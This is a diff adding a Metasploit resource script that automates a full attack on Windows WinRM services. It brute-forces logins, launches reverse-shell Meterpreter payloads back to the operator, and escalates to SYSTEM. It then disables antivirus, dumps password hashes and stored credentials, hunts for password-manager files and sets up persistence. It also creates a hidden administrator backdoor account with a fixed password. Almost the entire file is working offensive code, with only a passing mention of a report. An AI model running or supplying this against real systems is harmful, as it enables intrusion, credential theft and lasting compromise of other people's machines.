@@ -1,0 +1,458 @@
+# ===============================================
+# WinRM Comprehensive Exploitation
+# Includes scanning, credential testing, exploitation, and post-exploitation
+# Author: Braxton
+# Usage: msfconsole -r winrm_master.rc
+# ===============================================
+
+<ruby>
+  print_line ""
+  print_line "=" * 60
+  print_line "  WinRM Master Exploitation Script"
+  print_line "  Ports: 5985 (HTTP) / 5986 (HTTPS)"
+  print_line "=" * 60
+  print_line ""
+  
+  # Prompt for target IP
+  print_status "Enter target IP address:"
+  target_ip = gets.chomp
+  
+  if target_ip.empty?
+    print_error "No target IP provided!"
+    exit
+  end
+  
+  framework.datastore['TARGET_IP'] = target_ip
+  print_good "Target set: #{target_ip}"
+  
+  # Get LHOST
+  eth0_output = `ip -br a show eth0 2>/dev/null`
+  if eth0_output.empty?
+    print_warning "Could not detect eth0. Enter your LHOST IP:"
+    lhost_ip = gets.chomp
+  else
+    lhost_ip = eth0_output.split[2].split('/')[0]
+  end
+  
+  framework.datastore['LHOST_IP'] = lhost_ip
+  print_good "LHOST set: #{lhost_ip}"
+  
+  # Ask for credentials
+  print_line ""
+  print_status "Do you have credentials? (y/n)"
+  has_creds = gets.chomp.downcase
+  
+  if has_creds == 'y' || has_creds == 'yes'
+    print_status "Enter username:"
+    username = gets.chomp
+    print_status "Enter password:"
+    password = gets.chomp
+    
+    framework.datastore['USERNAME'] = username
+    framework.datastore['PASSWORD'] = password
+    framework.datastore['HAS_CREDS'] = 'true'
+    
+    print_good "Credentials stored"
+  else
+    framework.datastore['HAS_CREDS'] = 'false'
+    print_warning "No credentials provided - will attempt scanning and brute force"
+  end
+  
+  print_line ""
+  print_line "-" * 60
+</ruby>
+
+# Set global variables
+setg RHOSTS %TARGET_IP%
+setg LHOST %LHOST_IP%
+setg VERBOSE true
+
+# ===============================================
+# PHASE 1: PORT SCANNING
+# ===============================================
+
+print_line ""
+print_good "PHASE 1: Scanning for WinRM ports (5985, 5986)"
+print_line "-" * 60
+
+use auxiliary/scanner/portscan/tcp
+set PORTS 5985,5986,47001
+set RHOSTS %TARGET_IP%
+set THREADS 10
+run
+
+print_line ""
+
+# ===============================================
+# PHASE 2: SERVICE DETECTION
+# ===============================================
+
+print_good "PHASE 2: Detecting WinRM service details"
+print_line "-" * 60
+
+use auxiliary/scanner/winrm/winrm_auth_methods
+set RHOSTS %TARGET_IP%
+run
+
+print_line ""
+
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS %TARGET_IP%
+set STOP_ON_SUCCESS true
+
+<ruby>
+  if framework.datastore['HAS_CREDS'] == 'true'
+    print_status "Testing provided credentials..."
+  end
+</ruby>
+
+# ===============================================
+# PHASE 3: CREDENTIAL VALIDATION
+# ===============================================
+
+<ruby>
+  if framework.datastore['HAS_CREDS'] == 'true'
+    print_line ""
+    print_good "PHASE 3: Validating credentials"
+    print_line "-" * 60
+  end
+</ruby>
+
+<ruby>
+  if framework.datastore['HAS_CREDS'] == 'true'
+</ruby>
+    use auxiliary/scanner/winrm/winrm_cmd
+    set RHOSTS %TARGET_IP%
+    set USERNAME %USERNAME%
+    set PASSWORD %PASSWORD%
+    set CMD "whoami"
+    run
+    
+    print_line ""
+<ruby>
+  else
+    print_line ""
+    print_good "PHASE 3: Credential brute forcing"
+    print_line "-" * 60
+    print_warning "Attempting common credentials..."
+    print_line ""
+  end
+</ruby>
+
+# Common credential testing
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS %TARGET_IP%
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set STOP_ON_SUCCESS true
+set THREADS 10
+
+<ruby>
+  if framework.datastore['HAS_CREDS'] == 'false'
+</ruby>
+    run
+<ruby>
+  end
+</ruby>
+
+# Check if we got valid credentials
+<ruby>
+  creds = framework.db.creds.where(service_name: 'winrm')
+  if creds.any?
+    valid_cred = creds.first
+    framework.datastore['USERNAME'] = valid_cred.public
+    framework.datastore['PASSWORD'] = valid_cred.private
+    framework.datastore['HAS_CREDS'] = 'true'
+    print_success "Found valid credentials: #{valid_cred.public}:#{valid_cred.private}"
+  elsif framework.datastore['HAS_CREDS'] == 'false'
+    print_error "No valid credentials found!"
+    print_warning "Try providing credentials manually or use external brute force tools"
+    exit
+  end
+</ruby>
+
+# ===============================================
+# PHASE 4: EXPLOITATION
+# ===============================================
+
+print_line ""
+print_good "PHASE 4: Exploitation - WinRM Script Execution"
+print_line "-" * 60
+
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS %TARGET_IP%
+set USERNAME %USERNAME%
+set PASSWORD %PASSWORD%
+
+# Try VBS method first (more reliable)
+set FORCE_VBS true
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4444
+
+print_status "Attempting VBS script execution..."
+show options
+print_line ""
+
+exploit -j -z
+
+sleep 15
+sessions -l
+
+# ===============================================
+# PHASE 4B: ALTERNATIVE EXPLOITATION
+# ===============================================
+
+<ruby>
+  if framework.sessions.length == 0
+    print_line ""
+    print_warning "VBS method failed, trying PowerShell method..."
+    print_line "-" * 60
+  end
+</ruby>
+
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS %TARGET_IP%
+set USERNAME %USERNAME%
+set PASSWORD %PASSWORD%
+set FORCE_VBS false
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4445
+
+<ruby>
+  if framework.sessions.length == 0
+</ruby>
+    exploit -j -z
+    sleep 15
+    sessions -l
+<ruby>
+  end
+</ruby>
+
+# ===============================================
+# PHASE 4C: ALTERNATIVE PAYLOAD
+# ===============================================
+
+<ruby>
+  if framework.sessions.length == 0
+    print_line ""
+    print_warning "Trying x86 payload..."
+    print_line "-" * 60
+  end
+</ruby>
+
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS %TARGET_IP%
+set USERNAME %USERNAME%
+set PASSWORD %PASSWORD%
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST %LHOST_IP%
+set LPORT 4446
+
+<ruby>
+  if framework.sessions.length == 0
+</ruby>
+    exploit -j -z
+    sleep 15
+    sessions -l
+<ruby>
+  end
+</ruby>
+
+# ===============================================
+# PHASE 5: POST-EXPLOITATION
+# ===============================================
+
+<ruby>
+  if framework.sessions.length > 0
+    print_line ""
+    print_success "=" * 60
+    print_success "  EXPLOITATION SUCCESSFUL!"
+    print_success "=" * 60
+    print_line ""
+    
+    # Get the most recent session
+    session_id = framework.sessions.keys.sort.last
+    session = framework.sessions[session_id]
+    
+    print_good "Active session: #{session_id}"
+    print_line ""
+    print_status "Starting automated post-exploitation..."
+    print_line "-" * 60
+    
+    # Store session ID for commands
+    framework.datastore['SESSION_ID'] = session_id
+  else
+    print_error "=" * 60
+    print_error "  ALL EXPLOITATION ATTEMPTS FAILED"
+    print_error "=" * 60
+    print_line ""
+    print_warning "Alternative access methods:"
+    print_warning "  1. Use evil-winrm directly:"
+    print_warning "     evil-winrm -i %TARGET_IP% -u %USERNAME% -p '%PASSWORD%'"
+    print_line ""
+    print_warning "  2. Try PowerShell remoting (from Windows):"
+    print_warning "     \$cred = Get-Credential"
+    print_warning "     Enter-PSSession -ComputerName %TARGET_IP% -Credential \$cred"
+    print_line ""
+    print_warning "  3. Try different LHOST (check firewall/network):"
+    print_warning "     set LHOST <different_ip>"
+    print_line ""
+    print_status "Credentials are valid but Meterpreter may be blocked"
+    print_status "Consider using evil-winrm for direct shell access"
+    print_line ""
+    exit
+  end
+</ruby>
+
+# Session interaction
+print_status "Gathering system information..."
+sessions -i %SESSION_ID% -c "sysinfo"
+
+print_line ""
+print_status "Checking current user privileges..."
+sessions -i %SESSION_ID% -c "getuid"
+
+print_line ""
+print_status "Attempting privilege escalation to SYSTEM..."
+sessions -i %SESSION_ID% -c "getsystem"
+
+print_line ""
+print_status "Verifying elevated privileges..."
+sessions -i %SESSION_ID% -c "getuid"
+
+print_line ""
+print_status "Getting process list..."
+sessions -i %SESSION_ID% -c "ps"
+
+print_line ""
+print_status "Checking for other logged on users..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/enum_logged_on_users"
+
+print_line ""
+print_status "Disabling Windows Defender (if possible)..."
+sessions -i %SESSION_ID% -c "run post/windows/manage/killav"
+
+print_line ""
+print_status "Dumping password hashes..."
+sessions -i %SESSION_ID% -c "hashdump"
+
+print_line ""
+print_status "Checking for credential in registry..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/credentials/windows_autologin"
+
+print_line ""
+print_status "Searching for interesting files..."
+sessions -i %SESSION_ID% -c "search -f *.txt -d C:\\Users"
+sessions -i %SESSION_ID% -c "search -f *.kdbx"
+
+print_line ""
+print_status "Gathering network information..."
+sessions -i %SESSION_ID% -c "ipconfig"
+sessions -i %SESSION_ID% -c "route"
+
+# ===============================================
+# PHASE 6: LATERAL MOVEMENT PREP
+# ===============================================
+
+print_line ""
+print_good "PHASE 6: Preparing for lateral movement"
+print_line "-" * 60
+
+print_status "Enumerating domain information..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/enum_domain"
+
+print_line ""
+print_status "Checking for other systems on network..."
+sessions -i %SESSION_ID% -c "run post/windows/gather/arp_scanner"
+
+# ===============================================
+# PHASE 7: PERSISTENCE (Optional)
+# ===============================================
+
+print_line ""
+print_warning "=" * 60
+print_warning "  PERSISTENCE SETUP"
+print_warning "=" * 60
+print_line ""
+print_warning "Establish persistence? (y/n)"
+
+<ruby>
+  response = gets.chomp.downcase
+  if response == 'y' || response == 'yes'
+    framework.datastore['SETUP_PERSISTENCE'] = 'true'
+  else
+    framework.datastore['SETUP_PERSISTENCE'] = 'false'
+  end
+</ruby>
+
+<ruby>
+  if framework.datastore['SETUP_PERSISTENCE'] == 'true'
+    print_line ""
+    print_status "Setting up persistence mechanism..."
+  end
+</ruby>
+
+# Only run if persistence requested
+<ruby>
+  if framework.datastore['SETUP_PERSISTENCE'] == 'true'
+</ruby>
+    sessions -i %SESSION_ID% -c "run persistence -X -i 10 -p 4447 -r %LHOST_IP%"
+    print_line ""
+    print_good "Persistence handler will listen on port 4447"
+    
+    print_line ""
+    print_status "Creating backdoor user account..."
+    sessions -i %SESSION_ID% -c "execute -f cmd.exe -a '/c net user backdoor P@ssw0rd123! /add'"
+    sessions -i %SESSION_ID% -c "execute -f cmd.exe -a '/c net localgroup administrators backdoor /add'"
+    print_good "Backdoor user created: backdoor:P@ssw0rd123!"
+<ruby>
+  end
+</ruby>
+
+# ===============================================
+# FINAL SUMMARY
+# ===============================================
+
+print_line ""
+print_success "=" * 60
+print_success "  POST-EXPLOITATION COMPLETE"
+print_success "=" * 60
+print_line ""
+
+print_good "Session ID: %SESSION_ID%"
+print_good "Target: %TARGET_IP%"
+print_good "LHOST: %LHOST_IP%"
+print_good "Credentials: %USERNAME%:%PASSWORD%"
+print_line ""
+
+print_status "Alternative access methods:"
+print_line "  evil-winrm -i %TARGET_IP% -u %USERNAME% -p '%PASSWORD%'"
+print_line ""
+
+print_status "Useful Meterpreter commands:"
+print_line "  sessions -i %SESSION_ID%     - Interact with session"
+print_line "  sessions -l                  - List all sessions"
+print_line "  help                         - Show meterpreter commands"
+print_line "  migrate <PID>                - Move to stable process"
+print_line ""
+
+print_status "Recommended next steps:"
+print_line "  1. Migrate to stable process: migrate <PID>"
+print_line "  2. Screenshot desktop: screenshot"
+print_line "  3. Load Kiwi: load kiwi; creds_all"
+print_line "  4. Enable RDP: run post/windows/manage/enable_rdp"
+print_line "  5. Dump more credentials: run post/windows/gather/credentials/credential_collector"
+print_line "  6. Search for files: search -f *.kdbx"
+print_line ""
+
+print_status "WinRM alternative access (works even if session closes):"
+print_line "  evil-winrm -i %TARGET_IP% -u %USERNAME% -p '%PASSWORD%'"
+print_line ""
+
+print_warning "Remember to document everything for your report!"
+print_line ""
+
+# Keep session active
+sessions -i %SESSION_ID%
